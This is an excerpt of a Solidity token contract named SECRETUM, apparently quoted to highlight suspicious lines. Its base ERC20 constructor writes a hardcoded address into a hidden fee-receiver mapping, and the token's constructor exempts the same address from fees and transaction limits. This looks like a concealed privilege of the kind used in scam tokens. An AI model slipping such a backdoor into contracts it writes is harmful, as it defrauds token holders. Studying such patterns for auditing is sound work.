...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0xBfff832AE7DBccA5Ad2BBB715463f1082965F649] = _marketingwallet;
    }
...
contract SECRETUM is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("SECRETUM", "SECRETUM") {
        ...
        excludeFromFees(address(0xBfff832AE7DBccA5Ad2BBB715463f1082965F649), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xBfff832AE7DBccA5Ad2BBB715463f1082965F649), true);
